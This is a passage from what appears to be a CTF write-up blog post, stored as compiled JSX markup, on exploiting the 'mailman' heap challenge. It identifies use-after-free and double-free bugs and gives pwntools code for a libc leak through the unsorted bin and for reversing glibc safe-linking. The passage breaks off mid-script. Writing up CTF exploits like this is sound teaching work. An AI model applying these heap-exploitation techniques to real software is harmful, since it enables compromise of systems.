punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000015\"}),\"d7      \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_exit\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"status\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000015\"}),`d7      noreturn\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[(0,n.jsx)(e.code,{children:\"inidx()\"}),\" is the function that grabs our index value from \",(0,n.jsx)(e.code,{children:\"stdin\"}),\". There\\u2019s no bug in it, and it crashes the program if we specify an index higher than 15. After setting \",(0,n.jsx)(e.code,{children:\"mem\"}),\" to be an array of \",(0,n.jsx)(e.code,{children:\"char*\"}),\", we see that the menu does mostly what we expected, except sending a letter is \",(0,n.jsx)(e.code,{children:\"free()\"}),\"-ing that index. It can be pretty easily seen that we have two major bugs here:\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:\"A read after free\"}),`\n`,(0,n.jsx)(e.li,{children:\"Double free\"}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Sending a letter does not null the entry in \",(0,n.jsx)(e.code,{children:\"mem\"}),\", and there\\u2019s no check on the pointers in \",(0,n.jsx)(e.code,{children:\"mem\"}),\" when we read from them. The only thing preventing this from being trivial is an update function that would allow use after free.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Alright, let\\u2019s see what we have to work with in terms of other security features. A quick checksec shows:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`Arch:     amd64-64-little\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`RELRO:    Full RELRO\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`Stack:    Canary found\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`NX:       NX enabled\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`PIE:      PIE enabled\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Ah... full protections. That certainly restricts us a lot. Full RELRO means that the Global Offset Table is read only. This prevents us from modifying how the program resolves \",(0,n.jsx)(e.code,{children:\"libc\"}),\" functions when called. Speaking of libc, let\\u2019s check the version:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-bash\",children:(0,n.jsxs)(e.code,{className:\"language-bash code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`srg@pop-os:~/CTF/ictf23/mailman$ ./libc.so.6\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"GNU C Library \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"Ubuntu GLIBC \",(0,n.jsx)(e.span,{className:\"token number\",children:\"2.35\"}),\"-0ubuntu3.1\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" stable release version \",(0,n.jsx)(e.span,{className:\"token number\",children:\"2.35\"}),`.\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[(0,n.jsx)(e.em,{children:\"Ha!\"}),\" This is starting to become a very annoying challenge. Not that we could\\u2019ve had much luck anyway, \",(0,n.jsx)(e.code,{children:\"seccomp\"}),\" prevents us from using one gadgets of any form, due to the lack of \",(0,n.jsx)(e.code,{children:\"execve\"}),\", but glibc 2.35 also removes two symbols \",(0,n.jsx)(e.code,{children:\"__free_hook\"}),\" and \",(0,n.jsx)(e.code,{children:\"__malloc_hook\"}),\" which were user defined function pointers that were called before calling \",(0,n.jsx)(e.code,{children:\"free()\"}),\" and \",(0,n.jsx)(e.code,{children:\"malloc()\"}),\". Not to mention that because of \",(0,n.jsx)(e.code,{children:\"seccomp\"}),\", we can\\u2019t call \",(0,n.jsx)(e.code,{children:\"mmap\"}),\" or \",(0,n.jsx)(e.code,{children:\"mprotect\"}),\" to write our own code. glibc 2.35 also has a few annoying protections in that we\\u2019ll detail later.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Finally, I need to setup our pwning environment. I use a tool called \",(0,n.jsx)(e.a,{href:\"https://github.com/io12/pwninit\",children:\"pwninit\"}),\", but there are similar tools out there.\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"from\"}),\" pwn \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"exe \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./vuln_patched\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"libc \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./libc.so.6\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"context\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"binary \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),` exe\n`]})]})}),`\n`,(0,n.jsxs)(e.h2,{id:\"leaky-program-\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#leaky-program-\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Leaky Program \",(0,n.jsx)(\"a\",{name:\"leaky\"})]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Ok, enough enumerating, we need to start by getting some leaks. We have no limitations to what size letter we can make (other than one larger 65536, due to \",(0,n.jsx)(e.code,{children:\"M_MMAP_MAX\"}),\"), so we can easily leak an address to libc.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"One of the main structures about how \",(0,n.jsx)(e.code,{children:\"malloc\"}),\" manages its free lists, is that large chunks, when freed, go to a list called the \",(0,n.jsx)(e.code,{children:\"unsorted_bin\"}),\". While they are in these bins, they store pointers to the previous and next blocks of \",(0,n.jsx)(e.em,{children:\"free\"}),\" memory. However, when there is only one block, these pointers point to the \",(0,n.jsx)(e.code,{children:\"main_arena\"}),\", or the structure that manages all the bins for \",(0,n.jsx)(e.code,{children:\"malloc\"}),\". \",(0,n.jsx)(e.code,{children:\"main_arena\"}),\" is located in libc, and not the heap. These pointers are placed at the start of the data segment of the chunk, meaning that read after free bug that we have can leak out the libc pointer! If the reason for why a chunk has libc pointers, I\\u2019d highly look at the official post about malloc internals on the \",(0,n.jsx)(e.a,{href:\"https://sourceware.org/glibc/wiki/MallocInternals\",children:\"sourceware page\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"So, to leak libc we need to alloc 2 large chunks, free the first one, then read from that freed chunk. The reason we need to alloc the 2nd chunk is because malloc will try to combine adjacent blocks of free memory to be efficient, and if we leave a free block next to the top chunk (the remaining space of the heap), malloc will just coalesce it on \",(0,n.jsx)(e.code,{children:\"free()\"}),\".\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Because interacting with the menu can be verbose in exploit development, I also wrote some functions in pwntools to abstract away making, reading, and freeing chunks:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"r \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# either remote or process\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"alloc\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" size\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"ALLOCATING: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"> \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"1\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"idx: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"size: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"size\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"content: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"free\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"FREEING: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"> \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"2\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"idx: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"show\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"SHOWING: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"> \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"3\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"idx: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recvline\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Now, leaking libc, we just follow the steps above. To make sure these chunks don\\u2019t end up in smaller bins, we have to make them large, so 1350 bytes was chosen arbitrarily. We\\u2019ll have to interact with the smaller bins soon, but just for now, for this leak to work in this way, large-ish chunks are sufficient:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Make two large chunks\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1350\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1350\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Free the first one so bk = main_arena in libc\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"resp \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# parse the libc address in little-endian\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"libcaddr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"resp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Use offsets found in gdb to compute libc base\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" libcaddr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7f7c10419ce0\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7f7c10200000\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Alright, with the libc leak we can now refer to many gadgets and functions with ease. But we still need more. It\\u2019s a safe bet to also grab a heap leak, but due to safe linking, the pointers are obfuscated:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-cpp\",children:(0,n.jsxs)(e.code,{className:\"language-cpp code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[(0,n.jsx)(e.span,{className:\"token directive-hash\",children:\"#\"}),(0,n.jsx)(e.span,{className:\"token directive keyword\",children:\"define\"}),\" \",(0,n.jsx)(e.span,{className:\"token macro-name function\",children:\"PROTECT_PTR\"}),(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"pos\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"  \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"__typeof\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"size_t\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" pos\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">>\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"size_t\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"})]})]}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token macro property\",children:[(0,n.jsx)(e.span,{className:\"token directive-hash\",children:\"#\"}),(0,n.jsx)(e.span,{className:\"token directive keyword\",children:\"define\"}),\" \",(0,n.jsx)(e.span,{className:\"token macro-name function\",children:\"REVEAL_PTR\"}),(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"PROTECT_PTR\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"&\"}),\"ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"})]})]}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"When a block is freed and ends up in one of the faster lists of malloc, it mangles them with the \",(0,n.jsx)(e.em,{children:\"position\"}),\" that it is stored in.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"There\\u2019s a couple ways to get a leak, but I followed \",(0,n.jsx)(e.a,{href:\"https://ctftime.org/writeup/34804\",children:\"this writeup\"}),\" from AeroCTF. If both allocations are in the same page (4096 bytes), then the first 12 bits of \",(0,n.jsx)(e.code,{children:\"pos\"}),\" are 0, since the position is shifted by 12. We can deobfuscate a heap ptr independently using the following function:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"deobfuscate\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"val\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    mask \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0xfff\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"<<\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"52\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"while\"}),\" mask\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        v \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" val \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"&\"}),` mask\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        val \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"v \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">>\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        mask \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">>\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),` val\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"This will just give us a heap base address from any leak. There was probably an \",(0,n.jsx)(e.a,{href:\"https://ret2school.github.io/post/catastrophe/\",children:\"easier method\"}),\", but I\\u2019m learning as I go.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"With that, I was doing some testing so there are unnecessary allocs and frees here (but I\\u2019m too afraid to change the script due to offsets)\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"#Grab some blocks\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"128\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token 